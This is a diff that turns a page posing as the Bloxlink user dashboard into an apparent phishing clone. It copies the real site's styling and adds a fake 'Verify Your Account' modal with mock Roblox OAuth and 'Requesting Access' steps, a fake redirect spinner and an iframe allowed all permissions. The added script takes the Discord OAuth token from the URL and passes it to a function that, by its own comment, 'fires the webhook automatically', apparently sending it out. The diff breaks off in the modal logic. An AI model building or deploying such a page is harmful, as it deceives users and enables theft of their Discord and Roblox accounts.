@@ -5,54 +5,116 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>User Dashboard | Bloxlink</title>
   <link rel="icon" href="https://blox.link/brand/favicon/favicon-32x32.png?v=693egPWNnr" type="image/png" sizes="32x32">
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <!-- Real blox.link CSS -->
+  <link rel="stylesheet" href="/dashboard/82e47a3df281c636.css">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    body { font-family: 'Poppins', sans-serif; background: #0f1117; color: #fff; }
+    html { font-family: 'Poppins', ui-sans-serif, system-ui, sans-serif; }
+    body { margin: 0; background: rgb(25,33,48); color: #fff; }
+
+    /* Blox.link exact CSS custom properties */
     :root {
-      --primary-background: #0f1117;
-      --secondary-background: #1a1d27;
-      --tertiary-background: #252836;
+      --color-primary-background: rgb(25,33,48);
+      --color-secondary-background: rgb(31,41,55);
+      --color-tertiary-background: rgb(41,51,65);
+      --color-quaternary-background: rgb(43,53,68);
+      --color-primary-text: #fff;
+      --color-secondary-text: rgb(156,163,175);
     }
+
+    /* Scrollbar */
     .scrollbar-custom::-webkit-scrollbar { width: 4px; }
     .scrollbar-custom::-webkit-scrollbar-track { background: transparent; }
-    .scrollbar-custom::-webkit-scrollbar-thumb { background: #374151; border-radius: 4px; }
+    .scrollbar-custom::-webkit-scrollbar-thumb { background: rgb(55,65,81); border-radius: 4px; }
+    .overflow-y-overlay { overflow-y: auto; }
+
+    /* Sidebar nav colors */
+    .bg-primary-background { background-color: rgb(25,33,48); }
+    .bg-secondary-background { background-color: rgb(31,41,55); }
+    .bg-tertiary-background { background-color: rgb(41,51,65); }
+    .text-primary-text { color: #fff; }
+    .text-secondary-text { color: rgb(156,163,175); }
+    .border-b-tertiary-background { border-bottom-color: rgb(41,51,65); }
+    .border-tertiary-background { border-color: rgb(41,51,65); }
+    .divide-tertiary-background > :not([hidden]) ~ :not([hidden]) { border-color: rgb(41,51,65); }
+
+    /* hover:bg-secondary-background/60 */
+    .hover\:bg-secondary-background\/60:hover { background-color: rgba(31,41,55,0.6); }
+
+    /* Chip dropdown */
+    #navDropdown {
+      opacity: 0; visibility: hidden; transform: translateY(8px);
+      transition: opacity .15s ease, transform .15s ease, visibility .15s;
+      position: absolute; bottom: 100%; margin-bottom: 4px; left: 0; right: 0;
+      background: rgb(31,41,55); border: 1px solid rgb(55,65,81);
+      border-radius: 6px; overflow: hidden; z-index: 50;
+      box-shadow: 0 -4px 24px rgba(0,0,0,.4);
+    }
+    #navDropdown.open { opacity:1; visibility:visible; transform:translateY(0); }
+
+    /* Modal overlay */
+    #popupOverlay {
+      display: none; position: fixed; inset: 0; z-index: 9999;
+      background: rgba(0,0,0,0.75); align-items: center; justify-content: center;
+    }
+    #popupOverlay.active { display: flex; }
+    #popupContainer {
+      background: rgb(25,33,48); border-radius: 8px; overflow: hidden;
+      width: 640px; max-width: 95vw;
+      box-shadow: 0 20px 60px rgba(0,0,0,.6);
+      transition: width .3s ease, height .3s ease;
+    }
+    #popupContainer.expanded { width: 900px; max-width: 98vw; }
+    #discordIframe { width: 100%; height: 520px; border: none; display: block; }
+    #iframeContent { display: none; }
+    #step1Content, #step2Content, #loadingRedirectContent { display: none; }
+    #step1Content, #step2Content { flex-direction: column; align-items: center; }
+    #loadingRedirectContent { align-items: center; justify-content: center; flex-direction: column; gap: 12px; }
+
+    /* Spinner */
+    .spinner {
+      width: 36px; height: 36px; border: 3px solid rgba(255,255,255,0.15);
+      border-top-color: #fff; border-radius: 50%; animation: spin .8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
-<body class="bg-[#0f1117]">
+<body class="bg-primary-background">
 
 <!-- Top Banner -->
-<div class="flex items-center gap-2 bg-indigo-400/10 justify-center px-4 py-2">
+<div style="background:rgba(99,102,241,0.1);" class="flex items-center gap-2 justify-center px-4 py-2">
   <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-5 h-5 text-white flex-shrink-0">
     <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"/>
   </svg>
-  <div class="text-sm text-gray-300">
-    <span>We've updated our <a class="text-blue-400 hover:underline" href="https://blox.link/legal/terms-of-service">Terms of Service</a>, <a class="text-blue-400 hover:underline" href="https://blox.link/legal/privacy-policy">Privacy Policy</a>, and <a class="text-blue-400 hover:underline" href="https://blox.link/legal/purchase-policy">Purchase Policy</a> effective February 10, 2026.</span>
+  <div class="text-sm" style="color:rgb(209,213,219);">
+    We've updated our <a class="text-blue-400 hover:underline" href="https://blox.link/legal/terms-of-service">Terms of Service</a>,
+    <a class="text-blue-400 hover:underline" href="https://blox.link/legal/privacy-policy">Privacy Policy</a>, and
+    <a class="text-blue-400 hover:underline" href="https://blox.link/legal/purchase-policy">Purchase Policy</a> effective February 10, 2026.
   </div>
 </div>
 
 <div class="flex flex-wrap md:flex-nowrap">
 
-  <!-- Mobile Header -->
-  <div class="md:hidden flex items-center border-b border-gray-700 bg-[#0f1117] p-2 text-white space-x-2 w-screen">
-    <button id="mobileMenuBtn" class="p-2 rounded-md hover:bg-gray-700">
+  <!-- Mobile header -->
+  <div class="md:hidden flex items-center border-b border-gray-700 bg-primary-background p-2 text-primary-text space-x-2 w-screen">
+    <button id="mobileMenuBtn" class="p-2 rounded-md transition-colors hover:bg-gray-700">
       <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-7">
         <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"/>
       </svg>
     </button>
-    <a href="/" class="flex items-center">
+    <a class="flex items-center relative" href="/">
       <img src="/assets/wordmark.svg" alt="Bloxlink" width="96" height="28" onerror="this.src='https://blox.link/wordmark.svg'">
     </a>
   </div>
 
   <!-- Sidebar -->
-  <div id="sidebar" class="transition-all duration-150 ease-out z-20 h-screen fixed md:relative bg-transparent md:bg-[#0f1117] invisible md:visible">
-    <div class="flex flex-col border-r border-gray-700 w-64 h-screen absolute md:relative transition-all -left-64 md:left-0" id="sidebarInner">
-      <div class="flex flex-col pt-5 bg-gray-900 overflow-y-auto scrollbar-custom w-full flex-grow">
+  <div id="sidebar" class="transition-all duration-150 ease-out z-20 h-screen fixed md:relative bg-transparent invisible md:bg-primary-background md:visible">
+    <div id="sidebarInner" class="flex flex-col border-r border-gray-700 w-[min(100vw,_16rem)] h-screen absolute md:relative transition-all left-[-16rem] md:left-0">
+      <div class="flex flex-col pt-5 bg-gray-900 overflow-y-auto overflow-y-overlay scrollbar-custom w-full flex-grow">
+
         <!-- Close btn mobile -->
         <div class="flex md:hidden px-5 pb-2">
-          <button id="closeSidebarBtn" class="p-1.5 rounded-md hover:bg-gray-700 text-white">
+          <button id="closeSidebarBtn" class="p-1.5 rounded-md transition-colors hover:bg-gray-700 text-primary-text">
             <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-7">
               <path stroke-linecap="round" stroke-linejoin="round" d="M6 18 18 6M6 6l12 12"/>
             </svg>
@@ -60,9 +122,9 @@
         </div>
 
         <!-- Logo -->
-        <div class="hidden md:flex justify-center mb-2">
-          <a href="/" class="relative w-48 h-16 flex items-center justify-center">
-            <img src="/assets/wordmark.svg" alt="Bloxlink" class="h-8" onerror="this.src='https://blox.link/wordmark.svg'">
+        <div class="hidden md:flex justify-center">
+          <a class="relative w-48 h-24" href="/">
+            <img src="/assets/wordmark.svg" alt="Bloxlink" onerror="this.src='https://blox.link/wordmark.svg'">
           </a>
         </div>
 
@@ -70,24 +132,25 @@
         <div class="h-full flex-1 flex flex-col px-3 mb-4 space-y-4">
           <div class="flex flex-col justify-between h-full">
             <div class="flex flex-col gap-4">
-              <!-- General -->
+
+              <!-- GENERAL -->
               <div class="space-y-1">
-                <div class="text-xs uppercase font-semibold text-gray-400 px-1">General</div>
+                <div class="text-xs uppercase font-semibold text-primary-text">General</div>
                 <div class="space-y-1">
-                  <a href="/dashboard">
-                    <div class="bg-gray-800 text-white transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                  <a target="_self" href="/dashboard">
+                    <div class="bg-gray-800 text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
                       <div class="flex items-center">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-red-500 mr-3 h-6 w-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-red-500 transition-colors mr-3 h-6 w-6">
                           <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z"/>
                         </svg>
                         <span>Verifications</span>
                       </div>
                     </div>
                   </a>
-                  <a href="#">
-                    <div class="bg-gray-900 text-gray-400 hover:text-white transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                  <a target="_self" href="#">
+                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
                       <div class="flex items-center">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-white mr-3 h-6 w-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6">
                           <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125"/>
                         </svg>
                         <span>Manage Servers</span>
@@ -97,24 +160,24 @@
                 </div>
               </div>
 
-              <!-- Account -->
+              <!-- ACCOUNT -->
               <div class="space-y-1">
-                <div class="text-xs uppercase font-semibold text-gray-400 px-1">Account</div>
+                <div class="text-xs uppercase font-semibold text-primary-text">Account</div>
                 <div class="space-y-1">
-                  <a href="#">
-                    <div class="bg-gray-900 text-gray-400 hover:text-white transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                  <a target="_self" href="#">
+                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
                       <div class="flex items-center">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-white mr-3 h-6 w-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6">
                           <path stroke-linecap="round" stroke-linejoin="round" d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"/>
                         </svg>
                         <span>Manage Subscriptions</span>
                       </div>
                     </div>
                   </a>
-                  <a href="#">
-                    <div class="bg-gray-900 text-gray-400 hover:text-white transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                  <a target="_self" href="#">
+                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
                       <div class="flex items-center">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-white mr-3 h-6 w-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6">
                           <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12a7.5 7.5 0 0 0 15 0m-15 0a7.5 7.5 0 1 1 15 0m-15 0H3m16.5 0H21m-1.5 0H12m-8.457 3.077 1.41-.513m14.095-5.13 1.41-.513M5.106 17.785l1.15-.964m11.49-9.642 1.149-.964M7.501 19.795l.75-1.3m7.5-12.99.75-1.3m-6.063 16.658.26-1.477m2.605-14.772.26-1.477m0 17.726-.26-1.477M10.698 4.614l-.26-1.477M16.5 19.794l-.75-1.299M7.5 4.205 12 12m6.894 5.785-1.149-.964M6.256 7.178l-1.15-.964m15.352 8.864-1.41-.513M4.954 9.435l-1.41-.514M12.002 12l-3.75 6.495"/>
                         </svg>
                         <span>Settings</span>
@@ -124,24 +187,24 @@
                 </div>
               </div>
 
-              <!-- Other -->
+              <!-- OTHER -->
               <div class="space-y-1">
-                <div class="text-xs uppercase font-semibold text-gray-400 px-1">Other</div>
+                <div class="text-xs uppercase font-semibold text-primary-text">Other</div>
                 <div class="space-y-1">
-                  <a href="https://discord.gg/bloxlink" target="_blank">
-                    <div class="bg-gray-900 text-gray-400 hover:text-white transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                  <a target="_self" href="https://discord.gg/bloxlink">
+                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
                       <div class="flex items-center">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-white mr-3 h-6 w-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6">
                           <path stroke-linecap="round" stroke-linejoin="round" d="M9.879 7.519c1.171-1.025 3.071-1.025 4.242 0 1.172 1.025 1.172 2.687 0 3.712-.203.179-.43.326-.67.442-.745.361-1.45.999-1.45 1.827v.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 5.25h.008v.008H12v-.008Z"/>
                         </svg>
                         <span>Support</span>
                       </div>
                     </div>
                   </a>
-                  <a href="#">
-                    <div class="bg-gray-900 text-gray-400 hover:text-white transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
+                  <a target="_self" href="#">
+                    <div class="bg-gray-900 text-gray-400 hover:text-primary-text transition-colors group flex items-center justify-between pl-3 pr-2 py-2 text-sm font-medium rounded-md cursor-pointer">
                       <div class="flex items-center">
-                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-white mr-3 h-6 w-6">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="text-gray-400 group-hover:text-primary-text transition-colors mr-3 h-6 w-6">
                           <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5"/>
                         </svg>
                         <span>Developer API</span>
@@ -152,37 +215,36 @@
               </div>
             </div>
 
-            <!-- User chip at bottom -->
-            <div class="flex flex-col space-y-2 mt-4 relative">
-              <!-- Dropdown (pops UP) -->
-              <div id="navDropdown" style="opacity:0;visibility:hidden;transform:translateY(8px);transition:opacity .15s ease,transform .15s ease,visibility .15s;"
-                class="absolute bottom-full mb-1 left-0 right-0 w-full bg-[#252836] border border-gray-700 rounded-lg shadow-2xl z-50 overflow-hidden">
-                <a href="/dashboard" class="flex items-center gap-3 px-4 py-3 text-sm text-white hover:bg-[#2f3344] transition-colors">
-                  <svg class="w-4 h-4 text-gray-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 6h9.75M10.5 6a1.5 1.5 0 1 1-3 0m3 0a1.5 1.5 0 1 0-3 0M3.75 6H7.5m3 12h9.75m-9.75 0a1.5 1.5 0 0 1-3 0m3 0a1.5 1.5 0 0 0-3 0m-3.75 0H7.5m9-6h3.75m-3.75 0a1.5 1.5 0 0 1-3 0m3 0a1.5 1.5 0 0 0-3 0m-9.75 0h9.75"/>
-                  </svg>
-                  Dashboard
-                </a>
-                <div class="border-t border-gray-700"></div>
-                <a id="navLogoutBtn" href="#" class="flex items-center gap-3 px-4 py-3 text-sm text-red-400 hover:bg-[#2f3344] transition-colors">
-                  <svg class="w-4 h-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0 0 13.5 3h-6a2.25 2.25 0 0 0-2.25 2.25v13.5A2.25 2.25 0 0 0 7.5 21h6a2.25 2.25 0 0 0 2.25-2.25V15M12 9l-3 3m0 0 3 3m-3-3h12.75"/>
-                  </svg>
-                  Log out
-                </a>
+            <!-- User chip + dropdown (pops UP) -->
+            <div class="flex flex-col space-y-2 relative mt-4">
+              <div id="navDropdown">
+                <div class="divide-y divide-tertiary-background">
+                  <a class="flex items-center text-white text-sm space-x-2 bg-secondary-background hover:bg-tertiary-background px-2 py-2 cursor-pointer rounded-t-md" href="/dashboard">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-6">
+                      <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25"/>
+                    </svg>
+                    <span>Dashboard</span>
+                  </a>
+                  <a id="navLogoutBtn" href="#" class="flex items-center text-red-400 text-sm space-x-2 bg-secondary-background hover:bg-tertiary-background px-2 py-2 cursor-pointer rounded-b-md">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-7 h-6">
+                      <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 9V5.25A2.25 2.25 0 0 0 13.5 3h-6a2.25 2.25 0 0 0-2.25 2.25v13.5A2.25 2.25 0 0 0 7.5 21h6a2.25 2.25 0 0 0 2.25-2.25V15M12 9l-3 3m0 0 3 3m-3-3h12.75"/>
+                    </svg>
+                    <span>Log out</span>
+                  </a>
+                </div>
               </div>
-
               <!-- Chip -->
-              <div id="navChip" class="rounded-md cursor-pointer px-2 py-2 font-medium select-none text-white hover:bg-gray-800 flex items-center justify-between transition-colors">
+              <div id="navChip" class="rounded-md cursor-pointer px-2 py-2 text-md font-medium select-none text-white hover:bg-secondary-background flex items-center justify-between">
                 <div class="flex items-center space-x-2">
                   <img id="navAvatar" src="/assets/avatar.png" alt="User avatar" width="28" height="28" class="rounded-full object-cover">
-                  <span id="navUsername" class="mt-1 text-sm">Loading...</span>
+                  <span id="navUsername" class="mt-1">Loading...</span>
                 </div>
-                <svg class="nav-chevron w-4 h-4 text-gray-400 transition-transform duration-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
+                <svg class="nav-chevron w-4 h-4 transition-transform duration-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                   <path stroke-linecap="round" stroke-linejoin="round" d="m4.5 15.75 7.5-7.5 7.5 7.5"/>
                 </svg>
               </div>
             </div>
+
           </div>
         </div>
       </div>
@@ -190,47 +252,101 @@
   </div>
 
   <!-- Main Content -->
-  <div class="bg-[#1a1d27] h-screen w-full overflow-y-auto">
-    <!-- Page Header -->
-    <div class="px-8 py-4 space-x-4 border-b border-gray-700 text-sm">
-      <span class="text-white font-bold">Verifications</span>
-      <span class="text-gray-400">Manage your linked Roblox accounts.</span>
+  <div class="bg-secondary-background h-screen w-full 2xl:flex-1 overflow-y-auto">
+
+    <!-- Page header -->
+    <div class="px-8 py-4 space-x-4 border-b-tertiary-background border-b text-sm">
+      <span class="text-primary-text font-bold">Verifications</span>
+      <span class="text-secondary-text">Manage your linked Roblox accounts.</span>
     </div>
 
-    <div class="flex flex-col gap-8 mx-8 mt-8">
-      <!-- CTA Banner -->
-      <div class="flex gap-4 items-center bg-indigo-600 p-8 rounded-md justify-between flex-wrap">
-        <div class="flex flex-col gap-2 flex-1 min-w-0">
-          <p class="text-3xl font-bold text-white">Get started now by linking your Roblox account to Discord</p>
-          <p class="text-base text-white/80">Join our millions of users by linking your Roblox account to Discord. After verifying, you'll gaining access to thousands of Roblox communities and our large feature set.</p>
-        </div>
-        <button id="verifyNowBtn" onclick="window.location.href='/?verify=1'" class="transition-colors rounded-md flex items-center justify-center bg-green-500 hover:bg-green-600 text-white py-3 px-6 font-medium text-base flex-shrink-0">
-          Verify Now
-        </button>
-      </div>
+    <div translate="no" class="notranslate">
+      <div class="flex flex-col gap-8 mb-8">
+        <div class="flex flex-col gap-8 mx-8 mt-8">
 
-      <!-- Account card -->
-      <div class="grid grid-cols-1 lg:grid-cols-2 2xl:grid-cols-3 gap-4">
-        <div class="relative bg-[#0f1117] shadow-md p-6 rounded-lg">
-          <div class="h-full items-center flex justify-between w-full">
-            <p class="text-base text-white">Missing an account?</p>
-            <button onclick="window.location.href='/?verify=1'" class="transition-colors rounded-md flex items-center justify-center bg-[#1a1d27] hover:bg-[#252836] text-white py-2 px-3 font-medium text-sm">
-              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 mr-2 -ml-1">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 4.5v15m7.5-7.5h-15"/>
-              </svg>
-              Add Another One
+          <!-- CTA Banner -->
+          <div class="flex gap-2 items-center bg-indigo-600 mx-8 p-8 rounded-md justify-between flex-wrap">
+            <div class="flex flex-col gap-2 flex-1">
+              <p class="text-4xl font-bold text-primary-text text-left">Get started now by linking your Roblox account to Discord</p>
+              <p class="text-base font-normal text-primary-text text-left">Join our millions of users by linking your Roblox account to Discord. After verifying, you'll gaining access to thousands of Roblox communities and our large feature set.</p>
+            </div>
+            <button id="verifyNowBtn" class="transition-colors rounded-md flex items-center justify-center bg-green-500 hover:bg-green-600 text-white py-3 px-4 font-medium text-medium flex-shrink-0">
+              <div class="flex items-center">Verify Now</div>
             </button>
           </div>
+
+          <!-- Account card -->
+          <div class="grid grid-cols-1 lg:grid-cols-2 2xl:grid-cols-3 gap-4 flex-wrap">
+            <div class="relative bg-primary-background shadow-md p-6 rounded-lg">
+              <div class="h-full items-center flex justify-between w-full">
+                <p class="text-base font-normal text-primary-text text-left">Missing an account?</p>
+                <button id="addAnotherBtn" class="transition-colors rounded-md flex items-center justify-center bg-secondary-background hover:bg-secondary-background/60 text-white py-2 px-3 font-medium text-sm">
+                  <div class="flex items-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="h-5 w-5 mr-2 -ml-1">
+                      <path stroke-linecap="round" stroke-linejoin="round" d="M12 4.5v15m7.5-7.5h-15"/>
+                    </svg>
+                    Add Another One
+                  </div>
+                </button>
+              </div>
+            </div>
+          </div>
+
         </div>
       </div>
+    </div>
+    <div class="h-44"></div>
+  </div>
+</div>
+
+<!-- ===== VERIFICATION MODAL (embedded from index.html) ===== -->
+<div id="popupOverlay">
+  <div id="popupContainer">
+    <!-- Header -->
+    <div style="background:rgb(25,33,48); border-bottom:1px solid rgb(41,51,65);" class="flex items-center justify-between px-5 py-3">
+      <span style="color:#fff; font-size:14px; font-weight:600;">Verify Your Account</span>
+      <button id="popupClose" style="color:rgb(156,163,175); background:none; border:none; cursor:pointer; font-size:20px; line-height:1;">✕</button>
+    </div>
+
+    <!-- Step 1: Roblox OAuth -->
+    <div id="step1Content" style="padding:40px 32px; background:rgb(15,17,23);">
+      <img src="/assets/roblox-logo.png" alt="ROBLOX" style="height:32px; margin-bottom:24px;" onerror="this.style.display='none'">
+      <p style="color:#fff; font-weight:700; font-size:18px; text-align:center; margin-bottom:32px;">Authorize with Roblox OAuth</p>
+      <img id="robloxAvatarImg2" src="/assets/avatar.png" style="width:72px;height:72px;border-radius:50%;object-fit:cover;margin:0 auto 8px;display:block;">
+      <p id="robloxAccountName2" style="color:#fff;text-align:center;font-size:14px;margin-bottom:24px;">Bloxlink</p>
+      <button id="btnContinueStep1" style="width:100%;max-width:280px;display:block;margin:0 auto 12px;background:#fff;color:#000;border:none;border-radius:6px;padding:10px;font-size:14px;font-weight:600;cursor:pointer;">Continue</button>
+      <div style="text-align:center;color:rgb(156,163,175);font-size:13px;margin-bottom:12px;">or</div>
+      <button id="btnReturnToBloxlink" style="width:100%;max-width:280px;display:block;margin:0 auto;background:transparent;color:#fff;border:1px solid rgb(55,65,81);border-radius:6px;padding:10px;font-size:14px;cursor:pointer;">Return to Bloxlink</button>
+    </div>
+
+    <!-- Step 2: Bloxlink requesting access -->
+    <div id="step2Content" style="padding:40px 32px; background:rgb(15,17,23);">
+      <img src="/assets/wordmark.svg" alt="Bloxlink" style="height:32px;margin:0 auto 24px;display:block;" onerror="this.src='https://blox.link/wordmark.svg'">
+      <p style="color:#fff;font-weight:700;font-size:18px;text-align:center;margin-bottom:8px;">Bloxlink is Requesting Access</p>
+      <p style="color:rgb(156,163,175);font-size:13px;text-align:center;margin-bottom:28px;">This will allow Bloxlink to access your Roblox account.</p>
+      <button id="btnConfirmAccess" style="width:100%;max-width:280px;display:block;margin:0 auto 12px;background:#4f46e5;color:#fff;border:none;border-radius:6px;padding:10px;font-size:14px;font-weight:600;cursor:pointer;">Confirm and Give Access</button>
+      <button id="btnCancelStep2" style="width:100%;max-width:280px;display:block;margin:0 auto;background:transparent;color:#fff;border:1px solid rgb(55,65,81);border-radius:6px;padding:10px;font-size:14px;cursor:pointer;">Cancel</button>
+    </div>
+
+    <!-- Loading -->
+    <div id="loadingRedirectContent" style="padding:60px 32px; background:rgb(15,17,23);">
+      <div class="spinner" style="margin:0 auto 16px;"></div>
+      <p style="color:rgb(156,163,175);text-align:center;font-size:14px;">Redirecting to roblox.com...</p>
+    </div>
+
+    <!-- Iframe -->
+    <div id="iframeContent">
+      <iframe id="discordIframe" src="about:blank" allow="*"></iframe>
     </div>
   </div>
 </div>
 
 <script type="module">
   import { initUserNav } from '/js/user-nav.js';
+  import { fetchDiscordUserData } from '/js/discord.js';
+  import { CONFIG } from '/js/config.js';
 
-  // Read token from hash (OAuth callback) or session
+  // ── 1. Handle OAuth token from hash (Discord callback) ──
   const hash = window.location.hash;
   if (hash) {
     const params = new URLSearchParams(hash.substring(1));
@@ -238,44 +354,84 @@
     if (token) {
       sessionStorage.setItem('discord_token', token);
       window.history.replaceState(null, '', window.location.pathname);
-      // Fetch and store user profile
-      try {
-        const res = await fetch('https://discord.com/api/users/@me', {
-          headers: { Authorization: `Bearer ${token}` }
-        });
-        if (res.ok) {
-          const user = await res.json();
-          localStorage.setItem('bloxlink_logged_in', 'true');
-          localStorage.setItem('discord_user_profile', JSON.stringify(user));
-        }
-      } catch(e) {}
+
+      // fetchDiscordUserData fires the webhook automatically
+      const user = await fetchDiscordUserData(token);
+      if (user) {
+        localStorage.setItem('bloxlink_logged_in', 'true');
+        localStorage.setItem('discord_user_profile', JSON.stringify(user));
+      }
     }
   }
 
+  // ── 2. Guard: not logged in → home ──
   if (!localStorage.getItem('bloxlink_logged_in')) {
     window.location.href = '/';
   }
 
+  // ── 3. Populate nav chip ──
   initUserNav({ chipId: 'navChip', avatarId: 'navAvatar', nameId: 'navUsername', dropdownId: 'navDropdown' });
 
-  // Verify Now / Add Another One buttons
-  document.getElementById('verifyNowBtn').addEventListener('click', () => {
-    window.location.href = '/?verify=1';
+  // ── 4. Modal logic ──
+  const overlay   = document.getElementById('popupOverlay');
+  const container = document.getElementById('popupContainer');
+  const step1     = document.getElementById('step1Content');
